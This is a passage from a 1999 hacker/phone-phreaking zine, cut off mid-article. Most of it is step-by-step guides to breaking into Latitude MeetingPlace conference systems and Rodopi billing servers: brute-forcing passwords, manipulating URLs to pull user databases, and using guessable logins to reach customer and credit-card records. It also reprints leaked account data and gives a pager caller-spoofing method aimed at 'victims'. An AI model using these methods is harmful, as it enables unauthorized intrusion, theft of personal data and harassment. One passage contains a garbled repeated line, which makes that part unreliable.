@@ -1,0 +1,1886 @@
+
+	                                                 d8b 888 888          
+	                                                     888 888          
+	 .d8888b  8888b.  88888b.d88b.   8888b.  888d888 888 888 888  8888b.  
+	d88P"        "88b 888 "888 "88b     "88b 888P"   888 888 888     "88b 
+	888      .d888888 888  888  888 .d888888 888     888 888 888 .d888888 
+	Y88b.    888  888 888  888  888 888  888 888     888 888 888 888  888 
+	 "Y8888P "Y888888 888  888  888 "Y888888 888     888 888 888 "Y888888 
+
+
+    01100011 01100001 01101101 01100001 01110010 01101001 01101100 01101100 01100001
+
+
+[ Volume 1 / Number 1 ] [ November 1, 1999 ]
+
+
+	[ Contents: Issue 1 ->
+		- Editorial/Intro...........................ls
+		- MeetingPlace Conference System 101........castor
+		- Burning Bridges!..........................keen
+		- Rodopi Billing Software. . . .............discore
+		- Cellular Authentication and Algorithms....GPS
+		- Pager Spoofing............................dialect
+		- MYSQL Brute Force Attack..................memor
+		- h1p h4pp3n1ngz [aka news!] ...............discore
+		- Submissions and Contacts..................Staff
+
+
+	[ Staff (lewk mah, eye can alfabitize!) ->
+		- castor
+		- cwj     "everybody, at the speed of light, tends to become nobody"
+		- dialect
+		- discore "am thinkink eleet, da?"
+		- keen
+		- lowtek
+		- ls      "born 'n raised on the catfarms..."
+		- memor   "boo"
+
+
+
+ ______________________________________________________________
+|---------------> Editorial/Intro ---------------------------- |->
+ ¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
+	- Welcome to the inaugural issue of camarilla, this is a tech/telco zine
+	  that we have created for some unknown reason.  One of our main efforts
+	  in this attempt at creating an electronic publication, is to make it 
+	  something not only worth while, but also fun to read.  
+
+	  I don't really know how I ended up as the editor for this zine...I suppose
+	  one day my name just appeared on the webpage "ls - editor" so here I am.
+	  I'll try to do my best. I've never really done such a thing before, but 
+	  I think this isn't too shabby for a first attempt.  After reading if you 
+	  have any suggestions, comments, article submissions, etc, don't hesitate to 
+	  e-mail us here: camarilla@hektik.org
+
+	  Hrmm, I can't really think of much more to say, I was hoping that my 
+	  editorial would be a bit more philosophical than this because I was unable
+	  to find the time to write an article myself.  Which btw I apologize to the
+	  other staff members, I had to get pushy with them about getting articles in,
+	  then turns out I didn't write one...but hey, it is after all Issue 1...
+	  
+  	  on a side note: sh0utz and sp3cial th4nkz ->
+		- #!camarilla, #telconinjas, #telehack, #phreak (undernet)
+		- GPS, thanks for contributing, yer dead seckzy
+
+	  Thanks for reading, and have a fearable day.
+
+	  -- ls (lordsmurfs@caspers.net)
+
+
+
+	|-------------------------> w0op! 0n w1th th3 sh0w <-------------------------|
+
+
+
+ ______________________________________________________________
+|---------------> MeetingPlace Conference System 101 by castor |->
+ ¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
+	Ok most of you I know are into phones so here is my rant on
+Latitudes conf system. This text isn't going to tell you all about the menu
+system and all that cause Hybrid has already writen a file on that but didn't
+tell people to much on how to find the systems and hack them. A while ago I got
+cought up in the confs while they where being setup and run on a 24/7 basis.
+Me and some friends had found some interesting files on latitudes misconfigured
+servers. To get started i'll give some numbers out.
+
+1.8oo.242.3266 ext:66300
+1.8oo.280.1260
+
+	Now depending on the version of the system it will either be easy or a bit
+more difficult to find profiles. On older version of the system when you enter
+a profile number it would give an error message or if you found a valid profile
+and tthe system when you enter
+a profile number it would give an error message or if you found a valid profile
+and the user setup a greeting you would hear it such as "Technician". Also so you
+don't get disconnected every time you hit # to try another profile number you should
+hit * then 2 to cycle back to the "Enter your profile number" menu, by doing this it
+will think its your first time entering the number and you can keep doing this until 
+you get a profile number. Other wise you get disconnected after a few tries. Once you 
+made a list of profile numbers you can start trying to brute force the password. To do 
+this just try the profile number as the password, profile number backwards, profile number 
+with a one at the end, etc. Once you crack one get a pen and paper and write down 
+every meeting you are invited to, it will list off 30, giving you the date, time, and 
+pin number for the meeting. You should do this because many times they will have the 
+outdial enabled which is always fun to play with.
+
+	Meeting place is unique in the way that most of what can be done over the phone
+can be done over the web. Yes for every company that runs Meeting Place they have a web 
+server for it too. So while latitude.com was running their verry own bugy version of 
+Meeting Place I took it upon my self to look around. What I found was that the version 
+of Meeting Place latitude was running was even more fucked up than I thought. Users 
+information is kept on the server in txt files huh? you say well look.
+
+---[ Start ]---
+"fnm","lnm","uid","prfnum","phnum","ctctuid","grpnme","grpnum","tzcode","abbprmpts","anndpart","annentry","pwdreq","screntry","bcode","uactive","utype","cndial","shrtmnus","pwdonoutdial","whocanattnd","whocanlstn","canrecord","recordmtgs","IsAdvancedPromptsIsDefault","NamedDisconnectIsDefault","NamedIntroductionIsDefault","PasswordRequiredIsDefault","ScreenedIntroductionIsDefault","BillCodeIsDefault","IsActiveIsDefault","CanOutdialIsDefault","IsContactIDDefault","TimeZoneIsDefault","IsQuickMtgEntryAllowedDefault","IsPasswordRequiredOnODDefault","WFPasswordLastChanged","VUPasswordLastChanged","RecordMeetingsIsDefault","IsMeetingRestrictionDefault","IsMtgNoteRestrictionDefault","CanRecordMeetingsIsDefault","VName","IsODXLatTableNumDefault","IsMaxImmedMtgsPerDayDefault","IsMaximumMeetingLengthDefault","IsMaxVUIODsPerMtgDefault","ODXLatTableNum","MaxImmedMtgsPerDay","DayOfLastImmedMtg","NumImmedMtgsOnThatDay","MaximumMeetingLength","MaxVUIODsPerMtg","faxnum","pgrnum","mxattsprmtg","rcvnotifs","attndprf","prmryno
+ifprf","altnotifprf","pgrtype","emailtype","site","preferredunit","emailaddr","faxxlattblnum","sndnotifs","autodistatts","dfltnotifprio","sndnotifonmtgch","sndinvlstwnotif","sndmtgpwdwnotif","rcvattswnotif","playattlstfifo","schedprefunitonly","autostrtrcrd","disablerollcall","schedhomesiteonly","profileflex1","profileflex2","profileflex3","concurrentquestions","announceqarr","announceqdep","fqnadisabled","ftellpartpos","fadvanceinfo","fautoproenabled","fstartpeopleinwr","publiculallowed","groupulallowed","privateulallowed","meetingcategory","numdataparts","dataconfclienttype","chatclienttype","fallowdataconf","fchatsession","fismtgseminartype","fallowguestview","updatetime","qnanotify","InternetEmailAddr","EncryptedUserPWD","EncryptedProfilePWD"
+"Guest","User","guest","0000","","gd","System","0","gd","gd","gd","Beep","gd","gd","","Yes","EndUser","No","gd","gd","gd","gd","gd","gd","Yes","Yes","No","Yes","Yes","No","No","No","Yes","Yes","Yes","Yes",01/18/2033 00:00,01/18/2033 00:00,"Yes","Yes","Yes","Yes","Not_Recorded","No","Yes","Yes","Yes","0","gd",12/31/69 16:00,0,"gd","gd","","","gd","gd","gd","gd","gd","gd","gd","0","0","","gd","gd","gd","gd","gd","gd","gd","gd","gd","No","gd","gd","gd","gd","gd","gd","1","Beep","Beep","No","No","No","No","No","0","0","0","gd","0","0","0","No","No","No","No",09/29/97 10:44,"No","","Daefnlgjdaoh","Daefnlgjdaoh"
+"Sales","Engineer","salesengineer","0001","","gd","System","0","gd","gd","gd","Beep","gd","gd","","Yes","Technician","Yes","gd","gd","gd","gd","gd","gd","Yes","Yes","No","Yes","Yes","No","No","No","Yes","Yes","Yes","Yes",01/18/2033 00:00,01/18/2033 00:00,"Yes","Yes","Yes","Yes","Not_Recorded","No","Yes","Yes","Yes","0","gd",08/22/97 00:00,2,"gd","gd","","","gd","gd","gd","gd","gd","gd","gd","0","0","","gd","gd","gd","gd","gd","gd","gd","gd","gd","No","gd","gd","gd","gd","gd","gd","1","Beep","Beep","No","No","No","No","No","0","0","0","gd","0","0","0","No","No","No","No",09/29/97 10:44,"No","","Dachkldjlble","Dachkldjlble"
+---[ End ]---
+
+	The first row explains what everything means,  fnm = First nam, prfnum = profile #
+etc. This is just a short peice of the file that I got. Interesting thing is that latitude 
+being the creators of the conference system Latitude has clients ranging from Microsoft to 
+NASA. So listening on a conf is always interesting. You can also listen to conf logs which 
+are kept in .ra and .wav format. assuming you have access to the webserver. Other files may 
+have information such as:
+
+---[ Start ]---
+[03/24/97 02:44 PM]
+
+                           User Information Report                     Page 7
+
+Group Name: Web Sales              Group Number: 33661
+
+                      User       Profile  Contact Billing
+ Name                  ID        Number   User ID   Code     Active   Type
+
+--------------------
+Total in System                187
+
+    10700       32218664    7215  host125-131.latitude.com
+     9960       54643465    4060  shiva2-1.latitude.com
+     8414       71975996    2058  206.10.74.5
+     8321      111722568    3476  shiva-port1.latitude.com
+     5812      122150390    1620  low.latitude.com
+---[ End ]---
+
+	Again this file went on and on and on. Ok I know what some of you are saying how do 
+I fucking get access to the server. Easy manipulate the URL whats the URL? here go to 
+somesite.com/MPWEB/html now all that we used to do was delete the '/html' part either you 
+get a error saying directory listing not allowed or you gain access. Directory structure for 
+meeting place may look like the following or similar.
+
+    3/1/99  5:44 PM          104 _ODINST.INI
+  11/11/98  5:47 PM        <dir> audiosvc
+    6/2/99 12:26 PM        <dir> cgi-bin
+    6/2/99 12:25 PM        <dir> datasvc
+    6/2/99 12:25 PM        <dir> html
+    6/2/99 12:26 PM        <dir> images
+    6/2/99 12:02 PM        <dir> MEETINGS
+   7/12/99  3:56 PM          896 MPWEB301.ldb
+   7/15/99  1:44 AM      2729984 MPWEB301.MDB
+    5/6/99  2:27 PM        <dir> net120
+   2/19/99  7:45 AM        <dir> temp_tpl
+    3/1/99  5:40 PM        <dir> template
+    3/1/99  5:40 PM        <dir> zoneinfo
+
+	Note the MPWEB301.MDB thats a Microsoft Access Database with
+everything you need to hack that meeting place. Usernames Passwords E-mail
+addresses, real names you name it it's there. Here is a snipping of one file
+---[Start]---
+UserID	Password	FirstName	LastName	EmailAdd	Name	GroupID	RestrictFor	ContactID	TimeZone	TimeZoneIsDefault	Kind	fActive	fActiveIsDefault	WFPasswordChangeDate 
+3	Guest	        User		guest	0	0	0       0Yes 0 1	Yes	903915875 
+4	07049149452	Email	User		email	0	0	0	0	Yes	0	1	No	2147483647 
+20	01239441502	Sales	Engineer		salesengineer	0	0	0	0	Yes	4	1	No	2147483647 
+21	12069242201	Tech	Engineer		technician	0	0	0	0	Yes	4	1	No	2147483647 
+---[End]---
+
+This is just a small peice of the database but you get the idea :)
+
+The one thing all Meeting Place websites have in common is
+www.server.com/MPWEB. That MPWEB is what your looking for most sites main page
+will be www.something.com/MPWEB/html delete the /html and if its an old
+version it will let you in now look through the directories for anything. To find
+sites running meeting place go to your favorite search engine and type /MPWEB
+you should come up with a few sites es.net, some .edu, a .com and a few others
+I know of but forgot. You won't get a list of all sites that run the software
+since some servers are on the subnets and not on the main site. Not all
+meeting place systems identify themselves right away meaning when you call
+them. A friend of mine was going through extensions on some companies 800 number
+and found a Meeting Place system. They're not everywhere but are getting more
+popular so keep looking. The OS it runs on is NT so if you wan't to hack the
+server its running on go right ahead. As for default logins for MeetingPlace I
+don't know of any but there might be. nbtstat -A site.com looks like this.
+
+NetBIOS Remote Machine Name Table
+
+   Name               Type         Status
+---------------------------------------------
+MPLACEWEB      <00>  UNIQUE      Registered
+NOC            <00>  GROUP       Registered Edited
+MPLACEWEB      <20>  UNIQUE      Registered
+MPLACEWEB      <03>  UNIQUE      Registered
+TAG            <03>  UNIQUE      Registered Edited
+31337          <1E>  GROUP       Registered Edited
+INet~Services  <1C>  GROUP       Registered
+IS~MPLACEWEB...<00>  UNIQUE      Registered
+MPLACEWEB      <06>  UNIQUE      Registered
+
+MAC Address = 01-33-E7-75-46-L8
+
+note.
+Hybrids file on MeetinPlace can be found on the ninex webpage at www.ninex.com
+
+
+
+
+ ______________________________________________________________
+|---------------> burning bridges! by keen ------------------- |->
+ ¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
+
+the evil modern society which we live in seems to have propagated a lie which causes 
+many of us great misfortune throughout not only our day-to-day lives but ultimately 
+ruins them forever. yes, das is correctzors, the modern myth that "burning bridges" 
+is a bad thing. the ministers of disinformation and heads of our nations engrain the 
+negativity of this phrase into us by using their classical propaganda techniques, 
+including the one which i'm sure most of the readers of this great zine are familiar 
+with, definition defamation, or d squared for short. for those of you who aren't 
+knowledgeable of this term ( you aren't because you've been brainwashed to forget it ), 
+it involves the planting of mole lexiconographers into the offices of the many domestic 
+and international dictionary publishing companies. yea, agents employed by both world 
+governments and corporate america pull the strings of the very industry which controls 
+words. sounds pretty crazy, eh? well it's true, and we've photographs to prove it. but 
+back to the original topic of this paper... no no, i have to resume my avocations of 
+"burning bridges" and thus can no longer speak of the modern phenomenon of d squared. 
+yes, i know it seems selfish that i won't be addressing any of the other many words 
+and phrases (10s of thousands) which have been 'd squared up' (the term used by the 
+moles when referring to a word whose definition they have bastardized in order to 
+propagate their evil ideas) but this stupid zine isn't an appropriate forum for a more 
+in-depth account. erm, so, what was i saying? oh yea, burning bridges is actually a 
+good thing(tm). now, here's a little test .. when i've used the term "burning bridges" 
+did you immediately append "behind ones-self" to that? well i bet you did! see, these 
+ministers of propaganda have so brainwashed society that our minds immediately make links 
+from the original phrases to their debased definitions. now you may be wondering "what 
+difference does 2 extra words mean? burning bridges easily conveys the same meaning as 
+burning bridges behind ones-self". guess again mister smarty-pants! those two words make 
+a huge-ass difference in your sub-conscious interpretation of the word. you see, the 
+added phrase "behind ones-self" promotes a foul connotation in your mind. the key word 
+is "behind". it seems like the word means "in back of", but that meaning doesn't begin 
+to unravel the tangled web of lies which totally encompasses the word "behind". because 
+of the extra phrase "behind ones-self" the term "burning bridges" actually degrades 
+the person who the phrase is speaking of into a domesticated ass (equus asinus). 
+far-fetched? preposterous? cockamamie? no. i'll enlighten you as so how the phrase 
+"behind ones-self" totally twists into this hideous degeneration of humanity. in the 
+field of "disinformation propogation derogation" or dpd [hehe, that's the inverse of pdp, 
+fear the subliminal messages] for short, we draw diagrams to illustrate the path which 
+the human mind takes in _slightly_ changing the denotation of a word into a previously 
+concealed connotation of doom. the one for this phrase follows:
+
+behind ones-self
+  |        |
+ rear      me
+  |        |
+buttocks   |
+  |        |
+ ass       |
+  |        |
+  <-------->
+  |        |
+  me      ass
+  |        |
+  I       ass
+  |        |
+ I am     ass
+  |        |
+ I am an  ass
+  |        |
+ I am an Equus asinus
+
+there. now how degrading would it be to be an Equus asinus? _VERY._ nobody in their 
+right mind wants to be a long-eared, slow, domesticated beast of burden. when left 
+alone the two words "burning bridges" portrays correctly the idiomatic expression of 
+making decisions that cannot be changed in the future. but when changed into the phrase 
+"burning my bridges means people strap foodstuffs and heavy things to my back and 
+ride around on me and even occasionally push me off cliffs while i'm trying to sleep", 
+well, need i say more?
+
+i'll answer that one for you ever so loyal readers once again, yes, yes i must. now 
+that you know how to correctly use the phrase "burning bridges" (NOT like: "burning 
+bridges behind you), you're probably wondering why you would ever want to make a decision 
+that couldn't be changed in the future... well i'll tell ya why in 5 words. Fewer options 
+means easier decisions. isn't that true? it is, and by making decisions which remove 
+options you have less options. correct? hell yeah. less options means easier decisions. 
+by burning bridges you've less options and thus an easier life. let's take a look at it 
+solely from a probability and statistics point of view. scenario: you've been offered work 
+from 20 different companies. 20! a score as abraham lincoln would say! that's a lot. it'd 
+be impossible to select the one which is right for you from such a myriad of choices. this 
+is where burning bridges comes in. why not phone up 18 of the businesses and tell them all 
+about your craving to murder their executive offices? you needn't have such desires, but 
+you'll find much creativity comes into burning bridges. yup! you mayn't have realized it 
+but you've just done it! you've burnt bridges! congrats! but on with the scenario. now 
+there are only 2 choices left. you can pick one... or the other. one. the other. simple! 
+50/50. with 20 offers your chances of picking one are 5%. but with 2, you've a 50% chance 
+of picking one. now it doesn't take a rocket scientist to figure out 50% odds are better 
+than 5% odds. 1 in 2 chances to win instead of 1 in 20. big improvement. and since all those 
+places had 800 numbers you didn't even spend toll-charges. yup. choice reduction for free. 
+that's what "burning bridges" meant back in the day. even the word "burning" implies free. 
+fire's free. just whip out a magnifying glass, direct it at the rope railing of the bridge 
+and voila! it's on fire! right in front of your eyes! hmm, "burning bridges in front of 
+ones-self". now that sounds good. let's permanently change "burning bridges (behind ones-self)" 
+to "burning bridges in front of ones-self. that accurately portrays the definitions of the 
+idiom while simultaneously preaching the idea that burning bridges is a good thing. after all, 
+nobody does something in front of their self that's bad. but that's another story in itself.
+now i'd like to conclude this essay in the spirit of burning bridges so i'll just go with 
+the always helpful and never out-of-place: 
+"#$*@!&(*&$(*#@&)*$&#@()$#@elite$*#@&($&#@()$&#@(&$#@&*$@#(
+ok. there. i've just burnt some bridges. don't ask which ones though.
+
+ta-ta
+
+
+
+
+ ______________________________________________________________
+|---------------> Rodopi Billing Software by discore --------- |->
+ ¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
+Rodopi Billing Software is a product that does billing and such for internet 
+involved companys. I've noticed a lot of ISP's running NT like this software. 
+Can we say double stupid? Rodopi is supposed to make it all easy for tech support 
+guys to edit accounts, look up account information, and do basic billing procedures. 
+I first stumbled across this software when a friend of mine was working for a NT 
+powered ISP, and he happend to show me how to get free accounts there, all via 
+the web with NO passwords. I'm going to show you how to use and abuse Rodopi. 
+I'll give you ideas on how to find places running Rodopi. In the process of all of 
+this I may accidently suggest doing something that seems less than legal. I do 
+not suggest doing such things because you will need a new door after the feds kick 
+it down, and they are expensive plus annoying to install. If at any point any Rodopi 
+lawyers happen to be reading this, I would like to remind them of that little thing 
+called the First Ammendment. I'm just trying to show that shitty software like this 
+shouldn't be used because it is insecure and weak. What's wrong with that?
+
+
+\ Begin guide to hack planet now \
+
+First off we have to find somewhere running Rodopi. A quick and easy way to find 
+places running rodopi is to do a search for servers containing the directory;
+/olsplus/rodopi.html
+
+The software is usually installed there. Here is how it would look if it was an
+actual URL:
+
+<http://www.nsa.gov/olsplus/rodopi.html>
+
+I'm going to use nsa.gov for my example site from now on. No they don't use Rodopi 
+so don't even try. Sometimes it will be configured to run on a specific port. For 
+example I seem to see it on port 8181 a lot. A simple portscan can tell you if 
+you aren't sure what port it is on.
+
+To search for this directory goto like Altavista's advance search and figure it out. 
+I'm not making this a point and click guide to get credit card numbers just yet.
+As soon as you've found a site that run's Rodopi you will see a screen like this:
+
+<http://demo.rodopi.com/olsplus/rodopi.html>
+
+Now try going to Filter Search really quickly. If you see a Login/Password you 
+probably shouldn't even try. I haven't found a default login/password but most 
+places are relatively stupid. Try something generic like cs/cs1234 until you get 
+bored. Not all Rodopi servers are passworded. I know this for a fact, if you look 
+hard enough you _will_ find an unpassworded one. It will not ask for a password 
+until you start trying to do stuff. Keep that in mind.
+
+When you get to that screen, you will see a bunch of neat options. Lets take a look
+at them. Under the Subscription catagory we see, oh whats that? Create New Account? 
+Does this mean I'm "root" or whatever they call it? Might as well be, if you get to
+this page you have full access to that entire company (except for a few password
+popups :P). To the point of being able to take them offline completely.
+
+Speaking of taking places offline, one thing I should note really quickly. Buttons
+aren't what they seem to be. If you hit "Edit" next to something, it won't give you
+anything to edit. It will change it right away for you. Be careful we don't want to
+accidently knock anyone offline. That's bad for business.
+
+As you can see under 'Subscription' there are four neat things to to. The 
+first sort are sort of self explanatory. If you goto Customer Support it asks for 
+the customers Registration Number, and then if you know one it tells you a bunch 
+of worthless crap. List Roaming Phones, well this is sort of interesting. I think it 
+is for the company's cell phone wielding employees. Overall it isn't that neat, you 
+can get their e-mail addresses and tell them their rates are high though. Finding a 
+Registration number is Customer Support related, and worthless.
+
+Maintenence, ok, what's this first thing? Filter Search? Hey it asked me for a 
+password.  Thats right, don't even bother if it is password protected, unless you 
+want to brute force it.  Filter Search is probably the most important thing that I 
+will be discussing, so let me quickly finish up explaining the rest of the options 
+and I'll get back to it.
+
+Radius Attributes Editor is where you can completely check out up their setup. I 
+don't want to explain too much because this will turn into a Networking text. Pretty 
+much you can make some admin's day hell if you play with that. It asks for a login, if 
+you happen to guess or know one good job. If you happen to get a login/password make 
+sure you try it for all the login prompts, its probably all the same. If you haven't 
+noticed there are two types of password prompts. One is a popup that gets you into the 
+interesting stuff, and another is HTML that edits their setup.
+
+Management/Marketting Reports. Yay. Self explanatory? I don't know if anything worthwhile 
+will be found in here, although it doesn't seem to ask for a password. Knock yourself out.
+
+Printing, Archiving and Batch Payments. Well, you can see how their company is doing. 
+This is stats that only execs care about, unless you are planning some sort of corporate 
+takeover. Then it also may come in useful.
+
+Administration is really neat. You can totally re-edit their Rodopi configuration. 
+Some help with this may be found at:
+
+<http://www.rodopi.com/rodopidocinstall.html>
+
+That is the basic Installtion-HOWTO. I'm sure if you're feeling mischeiveous you 
+can find something to play with here.
+
+The Tech Support section has some lame stuff. That is probably totally worthless 
+unless, maybe, you're going for that whole corporate takeover thing.
+
+In the next section down you can edit their voicemail system. Listen to the boss's 
+voicemails (if you know his PIN) and do other bad bad illegal things that shouldn't 
+be done.
+
+And the last section is the Help section. It has some useful links for information 
+if you are confused. But remember this software is made for 16 year old tech support 
+junkies and starch-shirt execs. So I don't think its too confusing. They just put 
+the help there so they can claim they have "really good online docs." What a scam.
+
+So usually to get to the demo at rodopi.com you need to fill out some registration. 
+I skipped all that for you people and gave you the link right to the demo.
+
+Now in the registration it asks for all of your usual information, email, address, 
+name, phone number, etc. It says clearly at the top (in bold); Please fill out the 
+form completely. All the data is considered confidential. Well this is interesting. 
+I'm glad to see they are at least telling people its confidential.
+
+This brings me to the filter search, go click on it (on the demo site) and enter
+demoadmin/demoadmin for the login/password. You will see three different ways to 
+search. I usually like to search by date and do it maybe a month or two at a time 
+(from 10/99 to 11/99 for example).
+
+So lets search for 9/99 to 10/99. Wow 128 matches. Great. This may be a bit slow for 
+dialup users but you will soon see a light of names, and email addresses, with a button 
+you can select next to them.  Let's select the first person and look to the left. Hit 
+Edit Cust. and a new window will popup with all of the information they submitted when 
+they registered. How interesting, the information is considered confidential yet anyone 
+can get access to it? Before you sue me think about getting sued yourself.
+
+If you goto Edit Acnt. you will see the type of payment they make. Now if you were on 
+any other Rodopi server but the demo one, you would eventually find someone who pays 
+with a *gasp* credit card! Now I think carding is totally worthless but this is a good 
+example of a company having very private information publically availiable, all because 
+of their silly little billing software. This could spark major battles in Internet Privacy 
+if Rodopi were ever to be heavily abused. It is very easy to use this search if you 
+haven't noticed.  I'm starting to get too drawn out so I think you can figure out the 
+rest of it. Please don't email me asking for places that run a real Rodopi server 
+because I do not use these for any illicit activities, and I won't help you do the same.
+
+I hope this has enlightened you on getting information from a company that should 
+be private, because it isn't that hard.
+
+--discore (tyler@enjoy-unix.org)
+
+
+
+
+ ______________________________________________________________
+|------> Cellular Authentication and Algorithms by GPS ------- |->
+ ¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
+.authentication.and.a-keys.
+	Authentication is a process to prevent fraudulent access to the cellular 
+network by validating user units with algorithms. Most North American systems use 
+an authentication process based on the CAVE algorithm (IS-54 TDMA, IS-91 AMPS, IS-136 
+TDMA, and IS-95 CDMA). The GSM system uses an authentication process based on the A3 
+algorithm. Authentication is basically done to validate a mobile subscriber to 
+determine if it is fraudulent and if so, deny access to the cellular system from 
+that subscriber. The process of authentication takes place by transferring classified 
+information between the mobile unit and the system. During setup, each cellular phone 
+is given a number called an A-KEY. The A-KEY is never disclosed to others.
+
+	The subscriber enters the A-KEY into the phone by keypad and the phone
+uses the A-KEY to calculate and store a shared secret data (SSD) key. The network
+then performs the same calculations to create and store the SSD. During each processed
+call, the SSD key creates an authentication response code, and then during access, the
+phone transmits only the authentication response code. The authentication response
+changes during each call because the system sends a random number which is also used
+to create the authentication response code value. Someone who intercepts an authentication
+transaction over the air has no clue regarding the correct value of the SSD key, and
+has no way of repeating the response given in one authentication transaction to fool
+the system in another authentication transaction.
+
+
+.algorithms.and.xDMA.authentication.
+	An algorithm is the mathematical process of forcing manipulation of data so
+that if 2 processors have the same initial values, they produce the same answer. The
+answer from the authentication algorithm is used to determine if a subscriber seeking
+access to the system is a valid registered subscriber. The CAVE algorithm is utilized
+in authenticating most North American systems such as NAMPS, IS-54/IS-136 TDMA, and CDMA),
+and operates on a group of data bits called the shared secret data (SSD). The SSD is in
+both the mobile telephone and cellular system. If either the mobile unit or cellular
+system fail to have an incorrect value of the shared secret data, authentication fails
+and the call is not processed.
+
+	The SSD is 128 bits of data divided into 2 parts called SSD-A and SSD-B.
+SSD-A is used by te authentication process, and SSD-B by message encryption and voice
+privacy processes. Processing authentication relies not on the secrecy of the CAVE
+algorithm, but more on the values used when running and decoding the algorithm. Each 
+subscriber receives a secret number called the A-KEY (authentication key). The cellular 
+subscriber enters the A-KEY on the keypad after typing A-K-E-Y (as letters on the keypad), 
+then pressing the function key twice. The A-K-E-Y is entered into the mobile set one time 
+only, by the subscriber, and can then be forgotten. The subscriber does not need to 
+remember and use it repeatedly, like the PIN number used with some bank cards and in some 
+analog cellular phone backup authentication methods still in use today. The mobile 
+telephone doesn't use the A-KEY itself to authenticate the mobile set, but instead creates 
+and stores a secret key (SSD).
+
+	After the A-KEY is entered, it's known only to the subscriber and the network 
+home location register (HLR). The cellular system begins the authentication process 
+by sending an AUTH bit over the control channel in the continuous system parameter 
+overhead message (SPOM). When the mobile unit receives the AUTH information, it is set 
+so that it will always send the authentication response information in addition to other 
+values such as the mobile's ESN (electronic serial number) and dialed digits when starting 
+a telephone call. Mobile telephones add other data in addition to the authentication 
+response value processed by the CAVE algorithm. The random challenge value from the base 
+station adds one extra data element as a code. That's to ensure that the mobile unit and 
+base station are using the same random challenge value in their calculations to produce 
+the authentication response. The other extra data element is the "call count" value which 
+counts all calls made by the mobile unit. 
+
+	After receiving the results of the mobile's authentication process, the base station
+compares the answer to it's own calculations. If the values match, the call is processed.
+Once a voice channel is assigned, the base station may update the mobile's SSD with a new
+value to be used in future processing. Aside from being used for authentication, the CAVE
+algorithm is also used for message encryption and voice privacy. Message encryption "scrambles"
+non-voice messages sent between the mobile unit and the base station. The base station
+controls which m essages are encrypted.
+
+
+.algorithms.and.gsm.authentication.and.sim.
+	The GSM system uses the A3 authentication algorithm. The GSM A3 authentication
+algorithm is contained in a removable subscriber identification module (SIM) chip or 
+card. Unlike the CAVE authentication algorithm, which is standard for all mobile 
+telephones, the GSM A3 authentication process has several versions for use in different 
+countries. With a SIM card, a subscriber can use any PCS (personal communication system) 
+phone that has a card reader to make a telephone call. The SIM card is about the size of 
+a credit card, and must be inserted into the phone to activate it. While the card is in 
+the phone, the phone is personalized and becomes the user's personal data. The SIM card 
+contains a microprocessor which includes the personal identification number (PIN), services 
+subscribed to, authentication key and different authentication programs (so that different 
+system operators can use different authentication algorithms), IMSI, speed dialing lists, 
+and so forth are stored in the SIM card. 
+
+	The GSM algorithm processes data with shared secret data (called Ki) to create a 
+signed result (SRES). The Ki is stored in both the mobile telephone and cellular system. 
+After receiving the results of the mobile's authentication process, the cellular system 
+compares the answer to it's own calculations. If the values match, the call is processed. 
+If either the mobile unit of cellular system have an incorrect piece of the shared secret 
+data, the authentication process fails. The Ki key has a maximum length of 128 bits of data. 
+Ki is also used to create the key used for voice privacy encryption.
+
+	A random number (RAND) is sent on the broadcast control channel as part of the secret 
+key processing. This random number changes periodically. The random number, the Ki secret 
+data, and other information in the mobile telephone are processed by the A3 authentication 
+algorithm to create an signed response (SRES). The GSM system uses a different algorithm for 
+message encryption and voice privacy, unlike xDMA authentication and CAVE algorithms. The A5 
+algorithm creates a message encryption mask for voice privacy. The encryption mask uses 
+a Kc key, which is created at the beginning of each call, with an A8 encryption algorithm. 
+Throughout the call,the A5 algorithm uses the Kc key to scramble voice data sent to and 
+from the mobile telephone. Since the cellular system has access to the same set of secret 
+information, it makes the same encryption mask as  the mobile telephone and uses it to 
+unscramble the voice data before sending it to the land line network for the call to be 
+further processed.
+
+
+
+
+ ______________________________________________________________
+|---------------> Pager Spoofing by dialect ------------------ |->
+ ¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
+	Elitely enough, I, myself being a ninja trained in the art of telecommunications yearn 
+for something more in phreaking, something feared++, like run-on sentences!  Many have tried 
+but failed to successfully hax the beeper system.  For we all have had the power to Spoof our
+ani information when paging a friend but it was all of matter of doing it!  Simply enough.
+I am willing to train my fellow comrades in the extra elite stragedy in Beeper/Pager Spoofing.
+
+	Beeper spoofing is much like diverting.  Disguising your number so the other end has
+no clue who you are.  And with dialects extra uberistic way of spoofing you too can be phatty-
+boomba-latty.  Heres how we do it.
+
+1.] We first call the Victims Beeper
+    (example: 973-474-4839)
+
+2.] We then choose our method of madness. 
+    Here, we must choose the method to page,
+    and not to leave a message!
+
+3.] (Heres the elite part) We now enter a 
+    phone number totally different from where
+    you're actually calling from! (beeper systems secure!? Bah!)
+
+4.] End call by hitting "#" in most cases.
+
+
+	You may not believe it but what you just did was elitely spoofed your ani info.  In one
+try you're able to place the victim in total fear mode by totally bugging the shit outta him/her
+when they try to call the number back and find you are not there!!#%  To find out you were not 
+there in the first place is enough to place Houdini in fear mode!#  We use this elite stragedy
+for throwing off the evil feds that haunt us day in day out.  This one is for you guys! If you 
